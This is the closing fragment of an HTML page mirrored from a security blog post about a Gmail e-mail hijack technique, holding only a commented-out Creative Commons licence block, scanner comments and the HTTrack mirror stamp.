				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
			</License>
		</rdf:RDF> -->
		
		<!-- tested by blogsecurify -->
		<!-- wpscanner -->
	</body>

<!-- Mirrored from www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:06:31 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
</html>
